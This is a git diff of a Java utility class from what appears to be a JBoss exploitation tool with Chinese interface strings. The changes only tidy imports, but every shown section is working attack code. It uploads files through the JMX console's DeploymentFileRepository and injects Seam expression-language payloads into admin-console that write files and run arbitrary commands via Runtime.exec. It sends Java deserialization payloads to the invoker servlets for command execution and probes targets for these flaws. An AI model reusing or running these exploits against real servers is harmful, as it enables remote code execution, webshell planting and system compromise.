@@ -1,6 +1,8 @@
 package org.ha1yu;
 
 
+import org.apache.http.client.methods.CloseableHttpResponse;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -12,11 +14,6 @@ import java.util.Date;
 import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-
-import com.jbossexp.GenPoc;
-import com.jbossexp.MainMethod;
-import com.jbossexp.Utils;
-import org.apache.http.client.methods.CloseableHttpResponse;
 
 public class UtilMethod {
     public UtilMethod() {
@@ -31,17 +28,17 @@ public class UtilMethod {
         switch (index) {
             case 0:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIndex=5&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 result = getResult(targetUrl, filePath, pageName, httpResult);
                 break;
             case 1:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 result = getResult(targetUrl, filePath, pageName, httpResult);
                 break;
             case 2:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
-                CloseableHttpResponse response = com.jbossexp.MainMethod.doHttpRequest(url, "HEAD");
+                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
                 if (response != null) {
                     int statusCode = response.getStatusLine().getStatusCode();
                     switch (statusCode) {
@@ -72,7 +69,7 @@ public class UtilMethod {
                 fileContent = Base64.getEncoder().encodeToString(fileContent.getBytes());
                 fileContent = fileContent.replaceAll("/", "%2f").replaceAll("/+", "%2b");
                 url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7bexpressions.getClass().forName('java.io.FileOutputStream').getConstructor('java.lang.String',expressions.getClass().forName('java.lang.Boolean').getField('TYPE').get(null)).newInstance(('" + filePath + "'),false).write(expressions.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer(request.getParameter('c'))).close()%7d&c=" + fileContent;
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "网络连接错误";
                 } else if (httpResult.contains("user=&conversationId")) {
@@ -87,9 +84,9 @@ public class UtilMethod {
             case 7:
                 url = getExploitUrl(index, targetUrl, targetUrl);
                 byte[] fileByte = fileContent.getBytes();
-                byte[] payload = com.jbossexp.GenPoc.getObject(filePath, fileByte);
-                byte[] exploitResult = com.jbossexp.MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
-                String uploadResult = com.jbossexp.GenPoc.getCommandResult(exploitResult);
+                byte[] payload = GenPoc.getObject(filePath, fileByte);
+                byte[] exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                String uploadResult = GenPoc.getCommandResult(exploitResult);
                 if (uploadResult.contains("sun.reflect.annotation.AnnotationInvocationHandler") && uploadResult.contains("org.jboss.invocation.MarshalledInvocation")) {
                     result = "上传成功";
                 } else {
@@ -123,23 +120,23 @@ public class UtilMethod {
             url = getExploitUrl(index, targetUrl, targetUrl);
             byte[] payload;
             if (!flag) {
-                payload = com.jbossexp.GenPoc.getObject("../.readme.html.tmp", (byte[]) null);
-                com.jbossexp.MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                payload = GenPoc.getObject("../.readme.html.tmp", (byte[]) null);
+                MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
             }
 
-            payload = com.jbossexp.GenPoc.expolit(cmd);
-            byte[] exploitResult = com.jbossexp.MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+            payload = GenPoc.expolit(cmd);
+            byte[] exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
             result = GenPoc.getCommandResult(exploitResult);
         } else if (index == 3) {
             String httpResult;
             if (cmd.equals("pwd")) {
                 url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7brequest.getRealPath('/')%7d";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 String p = "user=(.*)&conversationId";
                 result = getMatch(p, httpResult);
             } else {
                 url = targetUrl + "/admin-console/index.seam?actionOutcome=/pwn.xhtml?user=%23%7bhtml?user=%23%7bexpressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('" + URLEncoder.encode(cmd) + "')%7d";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, "utf-8", "GET");
+                httpResult = MainMethod.httpRequest(url, "utf-8", "GET");
                 if (httpResult == null) {
                     result = "网络连接错误";
                 } else if (httpResult.contains("user=java.lang.UNIXProcess")) {
@@ -182,7 +179,7 @@ public class UtilMethod {
         switch (index) {
             case 0:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[0] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains("MBean Inspector")) {
@@ -193,7 +190,7 @@ public class UtilMethod {
                 break;
             case 1:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[1] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains("MBean Inspector")) {
@@ -204,7 +201,7 @@ public class UtilMethod {
                 break;
             case 2:
                 url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
-                CloseableHttpResponse response = com.jbossexp.MainMethod.doHttpRequest(url, "HEAD");
+                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
                 if (response != null) {
                     statusCode = response.getStatusLine().getStatusCode();
                     switch (statusCode) {
@@ -236,7 +233,7 @@ public class UtilMethod {
                 int randomNum2 = statusCode + (int) (Math.random() * (double) (max - statusCode + 1));
                 long num = (long) (randomNum1 * randomNum2);
                 url = targetUrl + "/admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b" + randomNum1 + "*" + randomNum2 + "%7d";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[3] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains(num + "")) {
@@ -247,7 +244,7 @@ public class UtilMethod {
                 break;
             case 4:
                 url = targetUrl + "/invoker/EJBInvokerServlet";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[4] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains("org.jboss.invocation.MarshalledValue")) {
@@ -258,7 +255,7 @@ public class UtilMethod {
                 break;
             case 5:
                 url = targetUrl + "/invoker/JMXInvokerServlet";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[5] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains("org.jboss.invocation.MarshalledValue")) {
@@ -269,7 +266,7 @@ public class UtilMethod {
                 break;
             case 6:
                 url = targetUrl + "/jbossmq-httpil/HTTPServerILServlet";
-                httpResult = com.jbossexp.MainMethod.httpRequest(url, charset, "GET");
+                httpResult = MainMethod.httpRequest(url, charset, "GET");
                 if (httpResult == null) {
                     result = "检测" + Utils.bugs_mainTab[6] + "漏洞失败，网络连接错误";
                 } else if (httpResult.contains("JBossMQ") && httpResult.contains("JBossMQ")) {
